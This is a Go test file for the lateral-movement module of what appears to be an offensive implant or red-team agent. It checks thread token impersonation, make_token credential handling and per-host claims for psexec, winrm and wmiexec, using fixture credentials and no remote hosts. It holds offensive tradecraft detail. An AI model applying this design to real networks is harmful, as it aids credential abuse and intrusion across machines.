//go:build windows

package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"testing"
	"time"
	"unsafe"
)

// Without make_token, a clean worker uses the process identity and does not
// manufacture explicit credentials from the process account's display name.
func TestLateralThreadDefaultProcessIdentity(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	_, err := runLateralThread(ctx, lateralPayload{Method: "winrm"}, func(payload lateralPayload, _ func(string)) (string, error) {
		if payload.winrmIdentity != nil {
			return "", errors.New("unexpected explicit default credentials")
		}
		var token syscall.Token
		ok, _, queryErr := advapi32.NewProc("OpenThreadToken").Call(^uintptr(1), 0x0008, 1, uintptr(unsafe.Pointer(&token)))
		if ok != 0 {
			token.Close()
			return "", errors.New("default worker retained a thread token")
		}
		if queryErr != syscall.Errno(1008) {
			return "", queryErr
		}
		return "process defaults", nil
	})
	if err != nil {
		t.Fatal(err)
	}
}

// An explicit payload identity selects the worker's network identity, with
// or without an active make_token: the worker thread impersonates the
// network-only logon and every method receives the credentials. LOGON_NEW_
// CREDENTIALS does not validate the password, so a fixture pair exercises
// the wiring without a real account.
func TestLateralThreadExplicitIdentity(t *testing.T) {
	payloadIdentity := &lateralIdentity{Domain: "LAB", User: "explicit-fixture", Password: "unused-fixture-password"}
	for _, method := range []string{"wmiexec", "winrm"} {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		result, err := runLateralThread(ctx, lateralPayload{Method: method, Identity: payloadIdentity},
			func(payload lateralPayload, publish func(string)) (string, error) {
				if payload.winrmIdentity == nil {
					return "", errors.New("worker did not receive the explicit identity")
				}
				if payload.winrmIdentity.user != payloadIdentity.User || payload.winrmIdentity.domain != payloadIdentity.Domain {
					return "", errors.New("worker received different explicit credentials")
				}
				var token syscall.Token
				ok, _, queryErr := advapi32.NewProc("OpenThreadToken").Call(^uintptr(1), 0x0008, 1, uintptr(unsafe.Pointer(&token)))
				if ok == 0 {
					return "", fmt.Errorf("worker did not impersonate the explicit identity: %v", queryErr)
				}
				token.Close()
				return "explicit identity worker", nil
			})
		if err != nil || result != "explicit identity worker" {
			t.Fatalf("method %s: %v (%q)", method, err, result)
		}
		// The worker wipes and reverts the identity; the payload credential
		// material stays available for the next deployment.
		ctx2, cancel2 := context.WithTimeout(context.Background(), 5*time.Second)
		_, err = runLateralThread(ctx2, lateralPayload{Method: "winrm"}, func(payload lateralPayload, _ func(string)) (string, error) {
			if payload.winrmIdentity != nil {
				return "", errors.New("identity leaked into a later ambient deployment")
			}
			return "", nil
		})
		cancel2()
		if err != nil {
			t.Fatalf("ambient deployment after explicit identity: %v", err)
		}
		cancel()
	}
}

// The explicit payload identity takes precedence over an active make_token,
// whose snapshot credentials must not leak into the worker.
func TestLateralThreadExplicitIdentityOverridesMakeToken(t *testing.T) {
	if _, err := makeTokenAction(".", "thread-fixture", "unused-fixture-password"); err != nil {
		t.Fatal(err)
	}
	defer rev2selfAction()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	_, err := runLateralThread(ctx, lateralPayload{
		Method:   "winrm",
		Identity: &lateralIdentity{User: "override-fixture", Password: "unused-fixture-password"},
	}, func(payload lateralPayload, _ func(string)) (string, error) {
		if payload.winrmIdentity == nil || payload.winrmIdentity.user != "override-fixture" {
			return "", errors.New("make_token snapshot replaced the explicit identity")
		}
		return "", nil
	})
	if err != nil {
		t.Fatal(err)
	}
}

// An active make_token supplies explicit credentials to the wmiexec chain:
// the in-process WMI client cannot reuse a cloaked thread identity for a
// second remote connection, so the worker must hand the stored credentials
// to ConnectServer on every deployment. PsExec keeps its ambient SCM/SMB
// staging and receives no credential snapshot.
func TestLateralThreadMakeTokenFeedsWmiexecIdentity(t *testing.T) {
	if _, err := makeTokenAction("LAB", "wmi-fixture", "unused-fixture-password"); err != nil {
		t.Fatal(err)
	}
	defer rev2selfAction()
	consume := func(method string) *winrmCredentials {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		var identity *winrmCredentials
		_, err := runLateralThread(ctx, lateralPayload{Method: method}, func(payload lateralPayload, _ func(string)) (string, error) {
			identity = payload.winrmIdentity
			return "", nil
		})
		if err != nil {
			t.Fatalf("method %s: %v", method, err)
		}
		return identity
	}
	if identity := consume("wmiexec"); identity == nil || identity.user != "wmi-fixture" || identity.domain != "LAB" {
		t.Fatalf("wmiexec must receive the make_token credentials, got %+v", identity)
	}
	if identity := consume("winrm"); identity == nil || identity.user != "wmi-fixture" {
		t.Fatalf("winrm must keep receiving the make_token credentials, got %+v", identity)
	}
	if identity := consume("psexec"); identity != nil {
		t.Fatalf("psexec must keep its ambient staging, got %+v", identity)
	}
	if _, err := rev2selfAction(); err != nil {
		t.Fatal(err)
	}
	if identity := consume("wmiexec"); identity != nil {
		t.Fatalf("wmiexec without make_token must stay ambient, got %+v", identity)
	}
}

// TestLateralThreadIdentity exercises the actual worker and callback boundary
// without contacting any remote host or launching a child process.
func TestLateralThreadIdentity(t *testing.T) {
	if _, err := makeTokenAction(".", "thread-fixture", "unused-fixture-password"); err != nil {
		t.Fatal(err)
	}
	defer rev2selfAction()
	before := callbackThreadAuthenticationID(t)
	for _, method := range []string{"psexec", "winrm", "wmiexec"} {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		result, err := runLateralThread(ctx, lateralPayload{Method: method}, func(payload lateralPayload, publish func(string)) (string, error) {
			if got := callbackThreadAuthenticationID(t); got != before {
				t.Error("worker did not receive the active logon session")
			}
			_, requestErr := runServerRequest(func() ([]byte, error) {
				var token syscall.Token
				ok, _, queryErr := advapi32.NewProc("OpenThreadToken").Call(^uintptr(1), 0x0008, 1, uintptr(unsafe.Pointer(&token)))
				if ok != 0 {
					token.Close()
					t.Error("server request retained a thread token")
				} else if queryErr != syscall.Errno(1008) {
					t.Errorf("query server request identity: %v", queryErr)
				}
				return nil, nil
			}, suspendServerIdentity)
			if requestErr != nil {
				return "", requestErr
			}
			if got := callbackThreadAuthenticationID(t); got != before {
				t.Error("server request did not restore worker identity")
			}
			return payload.Method, nil
		})
		cancel()
		if err != nil || result != method {
			t.Fatalf("method %s: result=%q error=%v", method, result, err)
		}
		if got := callbackThreadAuthenticationID(t); got != before {
			t.Fatal("worker changed the caller identity")
		}
	}
}

// TestLateralThreadDeadline verifies that waiting expires without canceling the
// operation, and that the operation can return after the caller has timed out.
func TestLateralThreadDeadline(t *testing.T) {
	started, release, finished := make(chan struct{}), make(chan struct{}), make(chan struct{})
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() { <-started; cancel() }()
	_, err := runLateralThread(ctx, lateralPayload{Method: "winrm"}, func(lateralPayload, func(string)) (string, error) {
		close(started)
		<-release
		defer close(finished)
		return "", errors.New("late fixture failure")
	})
	close(release)
	if err == nil {
		t.Fatal("deadline must report an inconclusive result")
	}
	select {
	case <-finished:
	case <-time.After(5 * time.Second):
		t.Fatal("late worker did not finish")
	}
}

// TestLateralThreadTokenSnapshot proves the owned handle survives revocation
// of the main command's token and still represents the original logon session.
func TestLateralThreadTokenSnapshot(t *testing.T) {
	if _, err := makeTokenAction(".", "snapshot-fixture", "unused-fixture-password"); err != nil {
		t.Fatal(err)
	}
	defer rev2selfAction()
	want := callbackThreadAuthenticationID(t)
	token, identity, err := captureLateralIdentity(true)
	if err != nil || token == 0 {
		t.Fatalf("capture token: %v", err)
	}
	defer token.Close()
	if _, err := rev2selfAction(); err != nil {
		t.Fatal(err)
	}
	if identity == nil || identity.user != "snapshot-fixture" || identity.password != "unused-fixture-password" {
		t.Fatal("dispatch credentials did not survive revocation")
	}
	encoded, err := json.Marshal(lateralPayload{Method: "winrm", winrmIdentity: identity})
	if err != nil || strings.Contains(string(encoded), "snapshot-fixture") || strings.Contains(string(encoded), "unused-fixture-password") {
		t.Fatal("local-only credentials entered the wire payload")
	}
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	if ok, _, err := procImpersonateLoggedOnUser.Call(uintptr(token)); ok == 0 {
		t.Fatal(err)
	}
	defer procRevertToSelf.Call()
	if got := callbackThreadAuthenticationID(t); got != want {
		t.Fatal("captured token changed after revocation")
	}
}

// The per-host claim is released by the pinned worker's deferred completion,
// not the caller's deadline: an immediate retry must find the host busy while
// the first deployment is still progressing, and free it once work ends.
func TestLateralClaimOutlivesCallerDeadlineAndFollowsWorker(t *testing.T) {
	payload := lateralPayload{Method: "winrm", Host: "claim-deadline-host"}
	if err := claimLateralHost(payload.Host); err != nil {
		t.Fatal(err)
	}
	hold := make(chan struct{})
	worker := make(chan struct{})
	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()
	go func() {
		defer close(worker)
		if _, err := runLateralThreadWithCleanup(ctx, payload, func(lateralPayload, func(string)) (string, error) {
			<-hold
			return "late fixture", nil
		}, func() error { return nil }, func() { releaseLateralHost(payload.Host) }); err != nil {
			t.Errorf("worker failed: %v", err)
		}
	}()
	select {
	case <-worker:
		close(hold)
		t.Fatal("worker returned before its move completed")
	default:
	}
	if err := claimLateralHost(payload.Host); !errors.Is(err, errLateralHostBusy) {
		close(hold)
		releaseLateralHost(payload.Host)
		t.Fatalf("an in-flight worker did not hold its host claim: %v", err)
	}
	close(hold)
	select {
	case <-worker:
	case <-time.After(5 * time.Second):
		t.Fatal("worker did not complete after its move returned")
	}
	if err := claimLateralHost(payload.Host); err != nil {
		t.Fatalf("worker completion did not release the claim: %v", err)
	}
	releaseLateralHost(payload.Host)
}

// TestLateralThreadCleanupFailure verifies that completion waits for cleanup
// and cannot report success after failing to clear the worker identity.
func TestLateralThreadCleanupFailure(t *testing.T) {
	t.Cleanup(func() { identityBoundaryFault.Store(false) })
	entered, release := make(chan struct{}), make(chan struct{})
	result := make(chan lateralResult, 1)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	cleanupErr := errors.New("fixture cleanup failure")
	go func() {
		output, err := runLateralThreadWithCleanup(ctx, lateralPayload{}, func(lateralPayload, func(string)) (string, error) {
			return "success must not escape", nil
		}, func() error {
			close(entered)
			<-release
			return cleanupErr
		}, nil)
		result <- lateralResult{output, err}
	}()
	select {
	case <-entered:
	case <-ctx.Done():
		close(release)
		t.Fatal("worker did not reach cleanup")
	}
	select {
	case <-result:
		close(release)
		t.Fatal("final result preceded cleanup")
	default:
	}
	close(release)
	got := <-result
	if got.result != "" || !errors.Is(got.err, cleanupErr) || !errors.Is(got.err, errIdentityUnsafe) || !identityBoundaryFault.Load() {
		t.Fatalf("cleanup failure did not fail closed: %+v", got)
	}
}
